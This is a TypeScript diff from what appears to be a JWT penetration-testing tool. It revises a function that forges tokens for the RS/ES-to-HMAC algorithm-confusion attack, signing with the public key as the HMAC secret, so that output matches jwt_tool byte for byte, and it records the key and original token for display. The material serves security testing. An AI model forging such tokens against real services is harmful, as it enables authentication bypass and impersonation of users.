@@ -12,7 +12,7 @@
  *  5. Public key recovered from multiple JWTs in HTTP history
  */
 
-import { signHMAC } from "../crypto/jwt.js";
+import { signHMACRaw, b64urlEncode } from "../crypto/jwt.js";
 import { publicKeyPemToRawBytes, x509CertToPublicKeyPem, jwkToPublicKeyPem, jwksToPublicKeys } from "../crypto/rsa.js";
 import { ecPublicKeyPemToRawBytes, x509CertToECPublicKeyPem } from "../crypto/ecdsa.js";
 import { fetchTLSCertPem, discoverJWKS, fetchJWKS, discoverPublicKeys, type UrlFetcher } from "../crypto/certFetch.js";
@@ -75,14 +75,14 @@ function makeAttack(
   sourceDesc: string,
   variantLabel: string
 ): AttackResult {
+  // Match jwt_tool's `-X k`: keep the original header, change only `alg`, and
+  // reuse the original payload's base64 segment verbatim. This makes the forged
+  // token byte-for-byte reproducible with jwt_tool and avoids subtle
+  // re-serialization mismatches (key order, whitespace, number formatting).
   const header = { ...parsed.header, alg: hmacAlg };
-  delete header.jku;
-  delete header.jwk;
-  delete header.x5u;
-  delete header.x5c;
-  delete header.kid;
-
-  const jwt = signHMAC(header, parsed.payload, secret, hmacAlg);
+  const headerB64 = b64urlEncode(JSON.stringify(header));
+  const signingInput = `${headerB64}.${parsed.payloadB64}`;
+  const jwt = signHMACRaw(signingInput, secret, hmacAlg);
 
   return {
     id: nanoid(),
@@ -114,6 +114,12 @@ function attacksForKey(
       const attack = makeAttack(parsed, hmacAlg, v.secret, sourceDesc, v.label);
       if (seen.has(attack.modifiedJWT)) continue;
       seen.add(attack.modifiedJWT);
+      // Attach the public key / certificate (and which encoding was signed with)
+      // so the detail pane can show exactly what produced this attack token, plus
+      // the original token (for jwt_tool reproduction commands).
+      attack.keyPem = keyPem;
+      attack.secretEncoding = v.label;
+      attack.originalJWT = `${parsed.headerB64}.${parsed.payloadB64}.${parsed.signatureB64}`;
       out.push(attack);
     } catch { /* skip invalid keys */ }
   }
